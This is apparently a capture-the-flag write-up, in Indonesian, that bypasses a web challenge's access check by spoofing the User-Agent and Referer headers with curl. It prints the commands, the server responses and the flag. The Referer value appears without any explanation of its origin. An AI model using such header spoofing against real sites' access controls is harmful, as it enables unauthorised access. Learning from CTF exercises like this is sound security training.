# Don't Bump Your Head(er)

## Deskripsi

Try to bypass my security measure on this site! 
[http://165.227.106.113/header.php](http://165.227.106.113/header.php)

---

## Analisis

Saat halaman diakses secara langsung melalui browser, situs menampilkan pesan penolakan akses.
Dari hasil inspeksi halaman (melalui _view-source_), ditemukan komentar HTML yang mencurigakan:

```html
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
<!-- Sup3rS3cr3tAg3nt  -->
```

Komentar tersebut mengindikasikan bahwa website melakukan validasi terhadap **_User-Agent_** pada HTTP request, dan nilai yang diharapkan adalah `Sup3rS3cr3tAg3nt`.

---

## Manipulasi Header

1. **Mengubah _User-Agent_**

Percobaan pertama dilakukan dengan memodifikasi header **_User-Agent_** menggunakan `curl`:

```bash
curl -A "Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
```

Output:

```html
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: 127.0.0.1
<!-- Sup3rS3cr3tAg3nt  -->
```

Dari respons tersebut dapat disimpulkan bahwa **_User-Agent_** saja belum cukup. Website juga memvalidasi `referer` pada header.

2. **Menambahkan __Referer__**

```bash
curl -A "Sup3rS3cr3tAg3nt" -e "awesomesauce.com" http://165.227.106.113/header.php
```

Output:

```html
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
<!-- Sup3rS3cr3tAg3nt  -->
```

---

## Flag

```flag{did_this_m3ss_with_y0ur_h34d}```


